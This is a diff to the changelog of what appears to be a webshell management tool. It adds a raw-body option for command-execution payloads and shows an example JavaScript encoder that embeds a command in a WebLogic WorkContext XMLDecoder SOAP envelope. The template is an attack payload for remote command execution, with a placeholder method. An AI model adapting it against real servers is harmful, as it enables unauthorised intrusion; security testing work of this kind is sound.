@@ -129,6 +129,38 @@
 
 * 修复 PHP SQLite 下自动生成的 sql 语句语法错误的 Bug
 
+* 新增其它配置「Body 设置为 RAW 模式」，目前支持 `CMDLinux` 和 `PSWindows`
+
+> 对于一些命令执行场景，发包时有时只需要纯 Payload, 而不需要键值。 比如复杂的 XML 结构, 此时就可以通过开启该选项，之后结合「编码器」组装 XML 格式 Payload 发送.
+
+比如（注意 Content-Type 需要同步配置）:
+
+```
+'use strict';
+
+module.exports = (pwd, data, ext={}) => {
+  data[pwd] = `<?xml version="1.0" encoding="utf-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java>
+          <void method="newInstance">
+              <void method="say" id="proc">
+                  <string>${data['_']}</string>
+              </void>
+          </void>
+        </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
+</soapenv:Envelope>`;
+  // 删除 _ 原有的payload
+  delete data['_'];
+  // 返回编码器处理后的 payload 数组
+  return data;
+}
+```
+
 ### 系统设置
 
 * 编码管理支持 cmdlinux 类型
